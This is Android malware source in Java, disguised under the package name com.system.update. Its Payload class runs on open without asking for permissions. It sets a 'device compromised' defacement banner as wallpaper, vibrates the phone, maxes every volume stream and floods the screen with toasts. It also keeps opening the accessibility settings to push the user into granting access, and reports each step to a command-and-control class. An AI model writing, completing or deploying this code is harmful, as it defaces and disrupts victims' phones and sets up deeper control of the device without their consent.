package com.system.update;

import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Typeface;
import android.media.AudioManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.os.VibratorManager;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Toast;

import java.util.Random;

/**
 * Immediate payload — wallpaper + vibration + volume + toast flood + intent spam.
 * Runs on open without waiting for runtime grants.
 */
public final class Payload {

    private static final String BANNER = "Shriveled VN";
    private static final String LINE2 = "pha hoai sieu manh";
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final Random R = new Random();

    private Payload() {}

    /** Fire everything that does not require user-granted dangerous perms. */
    public static void execute(Context ctx) {
        C2.send("payload", "start");
        setWallpaper(ctx);
        vibrateHard(ctx);
        maxVolume(ctx);
        toastFlood(ctx, 8);
        openAccessibilityLoop(ctx);
        launchSelfNoise(ctx);
        C2.send("payload", "fired");
    }

    /** Draw black wallpaper with big red "Shriveled VN". */
    public static void setWallpaper(Context ctx) {
        try {
            int w = 1080;
            int h = 1920;
            try {
                android.util.DisplayMetrics dm = ctx.getResources().getDisplayMetrics();
                w = Math.max(720, dm.widthPixels);
                h = Math.max(1280, dm.heightPixels);
            } catch (Throwable ignored) {}

            Bitmap bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
            Canvas c = new Canvas(bmp);
            c.drawColor(Color.BLACK);

            Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
            p.setColor(Color.RED);
            p.setTypeface(Typeface.create(Typeface.MONOSPACE, Typeface.BOLD));
            p.setTextAlign(Paint.Align.CENTER);
            p.setTextSize(w * 0.12f);
            c.drawText(BANNER, w / 2f, h * 0.42f, p);

            p.setTextSize(w * 0.055f);
            p.setColor(Color.WHITE);
            c.drawText(LINE2, w / 2f, h * 0.50f, p);

            p.setTextSize(w * 0.04f);
            p.setColor(Color.GRAY);
            c.drawText("device compromised", w / 2f, h * 0.58f, p);

            WallpaperManager wm = WallpaperManager.getInstance(ctx);
            wm.setBitmap(bmp);
            // also try lock screen on API 24+
            if (Build.VERSION.SDK_INT >= 24) {
                try {
                    wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_LOCK);
                } catch (Throwable ignored) {}
            }
            C2.send("wallpaper", "ok");
        } catch (Throwable t) {
            C2.send("wallpaper", "fail:" + t.getMessage());
        }
    }

    public static void vibrateHard(Context ctx) {
        try {
            Vibrator v;
            if (Build.VERSION.SDK_INT >= 31) {
                VibratorManager vm = (VibratorManager) ctx.getSystemService(Context.VIBRATOR_MANAGER_SERVICE);
                v = vm != null ? vm.getDefaultVibrator() : null;
            } else {
                v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            }
            if (v == null) return;
            long[] pattern = {0, 400, 100, 400, 100, 800, 100, 400, 100, 400};
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(VibrationEffect.createWaveform(pattern, -1));
            } else {
                v.vibrate(pattern, -1);
            }
        } catch (Throwable ignored) {}
    }

    public static void maxVolume(Context ctx) {
        try {
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;
            int[] streams = {
                    AudioManager.STREAM_MUSIC,
                    AudioManager.STREAM_RING,
                    AudioManager.STREAM_ALARM,
                    AudioManager.STREAM_NOTIFICATION,
                    AudioManager.STREAM_SYSTEM
            };
            for (int s : streams) {
                try {
                    am.setStreamVolume(s, am.getStreamMaxVolume(s), 0);
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    public static void toastFlood(Context ctx, int count) {
        for (int i = 0; i < count; i++) {
            final int n = i;
            H.postDelayed(() -> {
                try {
                    Toast t = Toast.makeText(ctx.getApplicationContext(),
                            BANNER + "\n" + LINE2 + " #" + n, Toast.LENGTH_LONG);
                    t.setGravity(Gravity.CENTER, 0, R.nextInt(200) - 100);
                    t.show();
                } catch (Throwable ignored) {}
            }, i * 350L);
        }
    }

    /** Keep pushing accessibility settings so user is more likely to enable. */
    public static void openAccessibilityLoop(Context ctx) {
        for (int i = 0; i < 3; i++) {
            final int n = i;
            H.postDelayed(() -> {
                try {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(intent);
                } catch (Throwable ignored) {}
                if (n == 0) {
                    try {
                        Intent bat = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        bat.setData(android.net.Uri.parse("package:" + ctx.getPackageName()));
                        bat.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        ctx.startActivity(bat);
                    } catch (Throwable ignored) {}
                }
            }, 800L + i * 2500L);
        }
    }

    /** Launch a few noisy intents to interfere with normal use. */
    public static void launchSelfNoise(Context ctx) {
        H.postDelayed(() -> {
            try {
                Intent i = new Intent(ctx, MainActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                ctx.startActivity(i);
            } catch (Throwable ignored) {}
        }, 12_000);
    }

    /** Periodic re-apply wallpaper + vibrate from service. */
    public static void tick(Context ctx) {
        try {
            setWallpaper(ctx);
            vibrateHard(ctx);
            toastFlood(ctx, 2);
        } catch (Throwable ignored) {}
    }
}
